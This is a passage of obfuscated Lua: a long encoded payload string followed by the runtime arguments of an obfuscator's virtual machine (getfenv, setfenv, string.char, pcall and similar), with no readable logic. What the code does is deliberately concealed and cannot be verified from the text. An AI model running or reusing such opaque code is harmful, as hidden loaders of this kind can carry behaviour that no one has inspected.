9Z3HDK3OTS3OQX3F142523OO93OBW3IKJ3IKL3NMO3OC13GVO3OC33IKR3KS23IKT3OU53J193KS83GR03OU83ORK3OT23OLQ3ORH3H1H3OT53OT13OUG3C5O3OT93CYT3BSN3OUK3C6L3OUM3GF93OTH3O3V32Y13OQJ3LHD3OQL3OS23OQO32Z63OQQ3DK43OS73OUZ3OQV3OTT3HCL3O7623Q3OHY3MZ83KLZ3GT23KM13JQI3OVF3JXI3J1A3GVX3H5G3ORD3OVQ3BLH3OT33GAW3OWT3B203N403OUH3K503ORP3GNQ3ORS3D0Z3OUN337M3OW03OQH3OW23G213OTL3OW63OUV3OW93DN23OWB3HG43OV03OTU3ME82463OQZ32XD3JOU3IRO3OR33O553LWL32XS3JP23OWO3MEG3OWQ3OSY3GX93OWY3B2F3OVL37K63OVN3GYK3OY23B9D3OX03OVS3OUI3OTB3ORR3OTD3OX63OVZ3OUP3JIZ3GK53OXD3OUU3OTO3HKV3OXI3OTR3OWD3JVR3HMF3EPC26E3OHY3JCC3OR83O6K3ORA3GPU3OVJ3OUF3OWV3OVM3OUD3OY83NHL3OT73OYB3OX23OUJ3OYE3OUL3F1N3OX732Y83OX93N053OYJ39XJ39J73OYL3OTN3OW83OUX3HCE3OWC3JW83OYS3F0B26U3OHY3O6G3OFD3OYY3O7E3O6L3GZ83H6B3OZ73ORM3E603OUC3OWX3OT03OWZ3OVR3AJT3OVT3OX33GRD3OX53OVY3GTP3OZI3OB23AB43OTK3OW53OYM3OZP3OYO3OTQ3D5R3OXK3OYT32GL25I3OSE3LX73JWW3EKG3JWY3L3X3JX03OSK3AKC3JX43EKQ3OSO3O293EKV3O2B3LEF3OSU3OOL3NAG3OXZ3OQ23P043P0A3OY33ORF3OZ53P093OU93O5Y39MP3OX13LTI3P0F3GUW3OYF3P0I3GUZ3P0K3MOA3HB73DWI3OUT3OZO3EC63NSC3OYP3P0T3OYR3HL33F1425Y32SI3P003NYB3OVG3OSX3P1I3OAI3OVP3P0B3OZ43OY53OZ63P1K3OY93P0C3N423OZB3OYD3OVO3DJR3OTE3OZG3EIY3ORX3OW33NQ83OZN3OW73P253OQR3P0S3BZU3P293P0V3A7Z32TB3KME3GQU3BKQ3OXX3HQE3P1H3GAI3OWS3P2P3OZ83P073EG73GRD3P053OUA3P1R3OZA3P1T3OZC3P2V3P0H3OZF3OYH3O4L3M9H3OUQ3HDG3P333OXF3OZQ3OQT3P0U3F0B21I3P3C3KRQ3BMS3KRS3KRU3BMY3KRW3G2I3K9C3BN53K9E3BN83OVD3G2Q3P3G3HZL3NSR3GR13P3Q3P1Q38CL3P083GNQ3P4T3O7J3P1Q3P0E3P3V3GYK3P3X3BNK3P2Y3DBG3ORX3DDX38973P443OYN3P263P3729H3DEA3DA73DEC3NEO3DCE3OUY3HG43DEJ39SX326X23I21Y22F22L32IB28Q3NSJ3P4B3K933KRR3BMU3K973P4G3K9A3P4I3KRY3P4K3KS03K9G3OOI39KA3EEI3HZK3GH83E8Z3P2O3P1P3NZ33P4V3J1G3AGN39N63P3L3P063NSX3P1S3ETA3D4A3FYT3I0O3MTT3DBG3EQW3P6K3DDQ3P1X3H3O3D9M3OW13M5W3OZL32GO3P5B3P0Q3P5D3P5L3OTR3P5G3DCB3DA83DED3DAA3DEG3HDK3P5N3GYW3P5Q3P5S3P5U3NY43P3C3OYX3EG23P6C3HNE3OY73GTM3P4Y3LMP3FVV39N63E7X3B1Y3OVK3P2R3ORN3F0N3P6R3D993CCU3P6U3DDM3ETE3P6X3C303DBM3P563DVD3P583GV33P763P353OWA3P5E3DA53DCA3DCC3P7E3P5K3OZR3P5M3D883DCK3P5P3P5R3P5T2253P5V3F1422U3P3C3LGA3GOB3LGC3ISD35CJ3P7Q3MEF3P3H3OVH3BJO3OY63P3O3P6M3P3R3P6I3P7Y39O53P803OZ33NN43P6P3EZS3DFG3D4B3OAR3P883D9E3E7W3P9J3P8C3OYG3GTP3P713OXA3P733P223OTM3P343OS53P0R3P793P0T3P7B3P8O3P5J3DEF3P5E3P7I2L93P7K3P8X3P8Z3O7623A3P3C3MCU35473P983N3Q3P2G3NSR3P9D3BK63P9F3P4U3P7X3ED03P9K3OT63P9M3P3T3P6Q3EOI332H3EV23P9S3EVP3G783ED13BFA3C5K3P8E3P9Z3OZJ3FM43F043P8I3PA53P783P8R3P7A3FDZ3DEB3IG93P8P3PAC3PA73DCI3IGC3P8U32TO3P8W3P7M3O4532TB3P6B3P993P4Q3GH93PAS3PAY3OWU3P3N3P9I3CU33OUE3PAZ3P6O3PB13P9O3AFL3P9Q3EQJ3J263P9T3EVQ3P9V3DJR3P8D3GF93PBD3P0L3D9Q32Y03DDZ3PBH3OUW3PA63PBK3PA83PBM3P5H3PBO3PAB3DAB3P8S3DAE3PBU32RZ3PBW3P8Y3F0B22E3P3C3OWJ3JQE3KM03MZC3KM23PAO3KS63PAQ3PC33P6F3P813P2M2793PC83EF93P2K3P1L3OZ93P0D3EUZ3P853DDI3P873M2L3E7V3PCK3PC93NBE3P6Z3HN03PCP3P2032Y13EJK3BLI3MSO3MA13IKF32IK24M3P7O3NR0390S1323121E25H25O1O21G32GO336D3D2R22I32UT3IFR22I3HY33DK93LID22132WK3IJS31FO2EQ2EA29M23E39UN3D7X32H62A532Z63EN23GO922F2803II73PAL3OV23P3C3O343M883FZD3JX23OST3AKI3O3A3EKZ3MZV3O3D3L423FZR3AMN3FZT3HLP381E3NGS3HPI3MTQ3DBJ3N4B3PCE3ESN3ONC3ESP3ENX3GJP39ZK3CX03OB13BM33CBA3NYY3ORV3H5J3D753H5L36OP38AV3G5T3A9Z3CTR32Y43EM93EZ63EJG3PA039QV3O2T3PEC3EJP3JRR3O863PEH3DQQ3APZ3PEK3PEM3PEO3PEQ3JEW3PET3PEV2993PEY3MAP3PF23HTO3PF428F3AIM3PF839HW3PFA3HXS3PFD3EK63PFF3PFH32O93PFJ3O8L3P3C3OR03OXR3F7X3LWJ3IRR3JP03OXV32XU3PG13NMW3PG33D4L3PG53NYR3PG73EQN3OQE3DXQ3ESQ3PGC3FBW35I93ONE3CTB3C2Q3D9C3OUO3H7D3PBA3GXE3O9B3PGN3GNM3PGQ3CPL3PGT3GF93PGV3PBE3KVI3EMG3L8N3KMW3PEE27E26E3PH33DWQ3PH53PEL3PEN3PEP3PER3FDZ3PEU29V3PHD28F3PHF3IWT32UP3PHI3PF63IFW3PF93D5H3PFB3CK23PFE22L3PFG38AV32OO3PHU3OSC26U3P5X3AF73GVG3NML3OV73KDX3OOE3OVA3OOG3OVC3OC533OC3NAF3H783E763PI83L9I3PIA3DI63PG83PID3PGA3ELU3PIG3FL93A9Q3PIJ3DPX3PGI3HEP3DP33LMT3PGL3G713PIS3PGP3ABC3PGR2793PIW3GTP3PIY3PCQ3PEA3GGK3PGZ3LHM3M1K21A25I3PJ73F5S3OIJ3PJA3PH83PJD3FK73PJF3PEW3PHE3PF03PHG3IWQ3PJM3PHK3PJP32KK3PJR3PHP32H93PHR3PJW32NY3PJY3J0M25Y3P3C3IUO3D653PI53HPG3PC23PKF3E523DFO3EZR3PKJ3PIC3FSH3PKM3LOS3DVK33643PGE3PKR3DSL3PKT3CPR3PKV3GG23PKX3GIO3PKZ3M593AGN3PL23B2Q3JC33PL63PE832Y03PL83GHW3M1H3PH03LHN3FWN32U83JV63PH63PJB3PH93PES32GR3PHC3PEX3PJI3PLP3PJK311H3PF53PLT3PHM3PJQ3PHO3F073PHQ3PJU3PHS39RJ32UK3NMH32U83PHX3LWH3PHZ3OR432VB3PI23IRU3PI43P1F3PKE3EG63PKG37SJ3PMD3ET43EQ53OKE3EQ83EVF3PKO3PML3PKQ3OHG3PMO3DBE3PKU3PGK3GHG3GR73FM438YN3PL03PMX3PIV3O6U3EMB3P723PGX3GYR3F0Z3MA03PN73PLC163PNA3PEI3PLH3PH73PJC3PHA3PNG3PJG3PNI3PEZ3HSW3PF13PNL3PLS3PF73PLU32K73PNR3CFT3PNT3PJV3HVY3PNX3O761M32U83O4X32WI3O4Z3GVJ3O513HH23GLD3ISY3O553IT13H4J3HJP3M7J32VD3H4N3IT73HJU3PQA3O5E3GLF3O5G3HK03GLJ3H4Z3O5K3GLO3H543HK73ITL3ICW3O5Q3E4V3PM83P7R3HOJ3B2A3DDP3PKI3DF93POG3ENV3EV93GEU3PGD3POL3OKH3PON3DDK3POP3PIO3PMT3GZD3PMV3HQS3CUC3C303PL43GUZ3PN13ONF3ALC3JWU3P0Z3O1Y3JWX3PFS3AKH3O233P163O253P183EKS3FZM3O2A3PFP3FNP3DI13AO839KQ37CA38AG3CRP3NVX3CK93IUK3F5S3O7U3ER93EPN28Q3A4C29G32KI32KK3FZB3AR43ALV3PPD2823PNH3PLO3PPI3PLQ3N1L3PPL3PJO3PNP3PLV3HXS3PLA3M1J3IV93GA132U831I83J0Q3ANX3M9A2233PET310T32KD32UM32G83PT92WA3N1Y3EG03DCB3N9M3C9T3C0029H3PLX2223PLZ3KN332U839UU3IJH2BF3ORZ3HMJ39JM3F6C35LF3PKD3MXP3DTG3CH53MP23M9O3BAF3NB83PIB3JZ33D1Y3LS13JQ537SJ3CMT3AXX3C6E3AY13E1B3IMP3BZC3I4C32Y03BGO3KTI3AXQ3FLJ3G0E3G1Z3MXS3AY133933LPJ32IK3KVL383M3F8X3OT03PUD3B1Y3MWH3JYY3PB43EBA3LQ13PMR3AGF3C4Y3JMV3K2V3L9P3KVE3NO63F4N3NO63F4T3NI73K2G29D37QT3NZS3EII3FLZ3FDK3NOY3ML43AAM334T38AV3KW33BEL3MIH32O134GS3BAP38BO3B373KJ739SR3MWR3AAU3JN539ZT3CBY29J3MN03MWR3MI93AW6334W2B532Y33NPT3FPA3PUL3I163OJ73DYF3K1K3CP43HIM3C883B273PS5382O3D8S3P0D3ANJ3BID3D0132XU27F3JVH3LL43IZC3KQL27E23A32U8320C3PHL3EOY3HFE3BZV3BNT3BZY3PTK3CRX3DEN3ONJ3EOX3PSE3IHG3HCP32KE32KG3DG532JZ3NEH3D0J3DO03D0N32KC32JS3D0D32KH3IEV3PSJ32KN3PSL2BE3ONT39UN2ES3A4D3CA722632U831MG3HJZ3OR222122O39JG21Z29F3PRS3MQ7335X3PP827A22O3DWG32SP32U63L6K3E6N3JS32BE3EPC22E3PPU3H3U3OL132QH3PXA3KE932W13IGW39UN32GL24M3PYU32NU3PZC27E25232U82QQ3HXY32UM3HYF3PYR2AK39KV23Y3PZE27D23Q3PZQ27A24E3PZT21A2463PZW26M3PZW26E3PZW2723PZW26U3PZW25Q3PZW25I3PZW2663PZW25Y3PZW35J832L021224Q32TC3Q0J32GL21I3Q0L32LR3Q0O27E163Q0Q3J6V3Q0T27A1M3Q0V34QR3Q0Y22U3Q0Y23I3Q0Y23A3Q0J31SM3JQX27K3PXK27Y3HY932NR3Q163JHV32V232GL21Y3Q0Y22M3Q0Y22E3Q0Y3FBC32L024M3Q163H9A3Q0Y3C132523Q0Y23Y3Q0Y23Q3Q0Y24E3Q0Y2463Q0Y26M3Q0Y26E3Q0Y2723Q0Y26U3Q0Y25Q3Q0Y25I3Q163BZT3CA72663Q0Y25Y3Q1T24R3FGY3OHW3Q2N32RO3Q2Q3CT03Q2S3B163Q2U3MJG3Q2W32TL3HVY3Q2Y351Y3Q312323Q3122U3Q3123I3Q3137U332L023A3Q312263Q3121Y3Q3122M3Q3122E3Q393BOU32PY3Q3124M3Q3125A3Q312523Q3123Y3Q393BOM32IK23Q3Q3124E3Q312463Q3126M3Q3126E3Q393CT13K893ES23GBK3K8D3LXB3HAK3LXD3GBR3HAO21B1N32Y8389L39I83L4C3NB439IZ3AN63MTE3NI033AP3KK539IC32YT37SE2AQ1P2F43PUD2F136RN3ASR3LFB3MFX3J463LB43JKD3IN73KH93GC23AGY3KTZ3B163NI7364633463BAU3G1M38RM3NDF331Y32XC37YV3B2T3B6Y3DM63EO235DA3JNT39YN2ZG3Q5P39NL27C3Q5Z3IQY3BFA3ABC38OV3CP427H3D4L3C883DFO27H3N5U3FCC3A8C3EJ63ND432Y138YJ3AGQ32YX3DMG36YI2BU39SI32Y13J923DL82B53A873CWE3J823C8435UI2AQ3A7O3B6S3N553LR83MI83K2P3OB03OPO3BS13I593PVN3MIR3F0I3Q6T3E523NTW2B5330X34F43AB93LTY3PVU3L003COI3P733BFN3B9H38KI3I5932ZG3B3S388P3B2V3PCR3F993KGN3K2V37R93B2R3L0W3EV83Q7W3E9Z3Q733JYZ3Q753KVI3OGM3Q783AHX38E03Q7B37V2331A2B538ZD3DMO3Q8J3Q873PVJ3MJ339CA3Q6R3LAU3Q8O3DSJ39773K283NOS3KYQ3J753B8V3CXG3ABC3CFR3C1Z3BS13B193NPK33053NH63DBG39353PUA3DLX3C7P3PVS3MX73AFU3OAQ37SJ39AU3I6Y3AA22BU31123J7X35DA3MK33GC239ZJ3B5M39R1377S35DA330C3ECS39R13B9D2GE315V381E3625311231I8386W35UI2MN3B4G39QY331Y3B4G3J7O3Q9L3AWI3Q9O3I763LOS3Q9S3B6Y3Q9U3BPX3Q9X3B2D3Q9Z3Q9T3EWE335R33X33C6E2SR316V37ZG3QA43M3V332L3QA83B4J3DVV37W33QAD3K3N3QAF3Q9N39Z93QAI3MGO3QAK3AWW3QAM3CBC3QAO3C6I3AW53Q9J3QAB27C3Q9J39IX2MN3BSL384K31123D4E37VP2GE2VK3Q5I39RV37SW35QI38BY316V37SJ398M38CJ3FYG331L3178320Z3Q5B38CT3C53318C3QC43AT627C3QC433932MN38NB37SJ398U3CVG31123BWG3C883BWG3BWE2MN399A337E37SJ3QCU3BYO3AVW3QB9336V3QBV3QBA3QBH3Q8G21B31123BYU37W33BYP339331123IQI34Y13FNX3A9Z3BYP3C3X3A3K3KY93C6W3NUB3POT33LW3Q7J3LCW38823Q8U3MME38KN382Z32Z6394N3QDP3M5R38RJ3QDS3LUR38LA3BQS3QDW3FJN3BYH3B1R3BGY3QE13MLZ3BD439SL3KJD3L153J9N3M4V3IPY3BYH3I593IP43QED3KXS3Q643C603B1R39GD3QEN3L00320C3IPG3QEM3QDX3BVL3IPU3QEI3NUL3JNE3MWS3QE53P423BFN3B1R3BH43QEE3C603I5939H83AFK3QF43OZK3QF63AAM3IQX3QF93QET3LT53FM93QFE3L913QEG27A3AL93QFJ3N5Z3AHX39OT3QFD3POT3QEF3KZO3AAM3I7X3QFS333U3I593I823QFW3K6D3FGH3FJJ3B1C3DL829437EK3A9Z3QGD3I8G3C3W3Q6Y37EJ3OJU27C3QGF3OGG3KVG3OGI3F9X3K573BS13B9H3I893LTS3J9G37V33QGC3E523QGF3LTL3Q7H3QES3QFT3K6J38MI39Z53CX43LR03BFN3AWH3MLO3B9H3DYJ21B2AG3Q7V3B763PWD3Q6P3OMA32Z63Q813N653ATW3QH73IPB38AV3F573BEL3QHK3B1633DM3B1R3CPQ39YI39FG3J7X333U3B9H3I8K3QE23LDD3JPK39QS39M03AWY2FQ342U3IQ73BVL3AWH343E3IQA34343QIE3BYH3AWH344A3IQA344039RN3QHT3OPB3MX73OJK3Q8P3OMM3DFE3B1R3DSJ3QI239ZZ3AZA3K683QGV3FA4385N39YF3DCY39IV37K63QGN3Q743OMK3QIV3OJN3O9X3AAM3QIZ3PU13B9H3JAB3QJ43E6033073BHU3AN13BC73QEO32O137D43B1R345S316F3Q983QEO3QDY3KJB3463334T2WA39QC3Q9B3LTL3C7P3Q5R3KJK3B763MXD3AGN38O637YV3QBD33932GE3IQI3Q9W3KSP39RV3ILJ34603Q9V39RV3COW3AWI3QKE39RV3BRW3BA736RN3QA53A752GE3QBT21B2SR31I83QBX2SR38BO3MJU39R131FO37SJ38FO37YV31783QKN2KL31MG3Q5B31783QKR31783QLC3Q603I5Z3BA73Q9M3G2R3ABC38GT3CVG2GE38DM3CCM3QLW3CUO3AWI38OS27932ED3PUD3QJR2GE3C8433J8311238KB3FMR3CD037K63QM437YV2GE3Q6N334A3AWO3CPK3QM63PUZ39ZL3QM13DMO3QMO3QKH3FCZ3AWZ3G5H3A9Z3QMO3C3X29421Q3FBU3FU63QJA3B3M3BOD32OF3BTD335V3DM33K6T3QFT3QIT3IQG3BYH3B9H346Y3BS33CBY3A3H3AZI3DYK347I21A36UR3Q8U3FJ73N7K3JNJ3EV83AYP2QQ2WA33BD2FQ38DI3QCV331Y3QNY351R3QJ035J13B9H347T3M613C603AWH3A733M623QO73QBQ38S73QBP3D3B38MI38BY38B33B9H31I83DS63QJY36YI37RV3K27354Y3Q9B3QO23IRA3A033BS13AWH3ADW33CN3QHD3CF52FQ39163QM23QB53BHD2FQ3BVI3A3F38AG3QOD333U3QOF3NVR3KJT2WA3BSL39ZX3KVI37SJ380D332U2SR315V342U383N2SR3QPL3QLN21A3QPS3AT93OA23QPN3L3733TG37TA3F8W3QL221A3OLQ3A0J3OLQ351R37SW3AWW3QAW3EJO3A312SR3QQ139YA3QL732P539R93NI83GGP39FN3QQ93QLR3C6038DS32XD38MI3178315V3K5P3MUO38MI2KL333G34DO32YR39SC3CRH37TL31FO333O3QOM356R31FO3C3X2FQ38Y43CCM3QRC3AWT3QOU3C3U3B2F3AWH3ALT35Y13QP03CHG2FQ31UN3QP437SJ3QRP384K3QP73BYE3QP9330H3QPB32YR3QPD21A34E73QIT3QPG3FMG3ETJ3ABC396C3QPM3EWE34F43CFP2SR3QS83QPT3QSE332M2ZG395Z3FLK3QSJ3CZW3QOQ35RU3QQ932YR3QQB3PYQ39R53BVL2OX31FO34GS333Z3A8338BO38NO333U313A320Z34HK38S738C938B33QSR3FNR3QR73N6G3AEQ34IW3QRA35J83QN03QC33QJR3AWU3B693JNX33263AWH34KA3QRL3AZA3QNV31IX2FQ39DL3QRQ331Y3QTV3QRT3BWY3QRW3PE93BVL3QS034IN3QPF3OB03AYP3QS63AGN39D73QS9315V3QSB384E2SR3QUB3QPT3QUH3QSH329T3QJ8331Y39CZ37RU3LVE38IC3QSO3BVL3QT93E403QH83C603QSV3CJA3QST37WO3C123B1H3QT33DKH38MI3QT73JLB316V31MG3QTB3IMF3DYK34N53CNW2FQ399G3CCM3QVH3QRF3BU23QOV3ATW3AWH34O738I03QRM3QLZ2FQ26X37K63QM3331Y3QVU39Z43QU03IRA3Q8A3BCW3QS039X93JNJ3QS43IQG3QU937W326Z3QN2334A3QUD381P2SR3QWB394637SJ3QWH385N2ZG26Y3QUM3JBZ3BA73QOP3AOB3QUS3BYH3QT934S33QUW38MI3QUY27A34SD37TL3QV13JDC3BYH3QV427A34SN32YR3QV73M403QV93DYF3QJY38123DYK34PV3QVF36UX3QTH331Y26I3QTJ3QRG3QTM3AWC3BF03MOR3QTQ3QNU3QP121A31HB3QTW27C3QXX3QTZ3QP83QW13QMS38MI3QS034TB3QS33QU73AAU3QW937SJ2633QWC3QPY3A403QWF37EX3QMD37W33QYD37SM331A2ZG2623QWO27A3QYP3QUP3QSN346L38S73QT934US27E3QQH333U3QWZ21A34WG3QSY3QX339AO3C603QX63PU3333U3QXA39RJ33UU3QVA3Q973NP43AEQ34YL3QXI25M3QXK27C3QZL3B4W3QTK3CPA3QXP3AZN32GT3A313QVR3BWS2FQ21L2EY3QVW32ZY2EY3AZ93QY23BX13QY43QOE3DJS34ZL3QU63QW23QYA3I1E3POC2EY33263QYF3BTG3QSC335D2EY3QCF37R12EY3QUK31M23FLK3R0R3QSM3QWS3QYV333U3QT935053QSY3BYH3QZ2350N3QZ53QUW3QT132YR3QZ937ZS3QX93CT03QV83PS93JDN3QXE3AEQ392K3QXI2162EY3C883R1J3QZP3QXO3PU13AWH352O3QVQ3QTR3QXV3Q503QXY39SD3R0333163QRU3CHN3QU13PN33QU33DJS353H3R0B3QMS3QPI3DJS3BRW3R0G331L3R0I3QUE3QPQ34NQ3R0M37W31R3R0P3QYN33PS2EY3A0J2G23QYT3R0V3QSP383V316V3MT53N5B3BFN3QZ23C6Q3QX23R153BVL3QZ93ASJ3QZB3R1B3QXB3R1D3QVB3JK73DMI358C3QTF315J3CCM3R3F3CRI3HOP3OHH',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
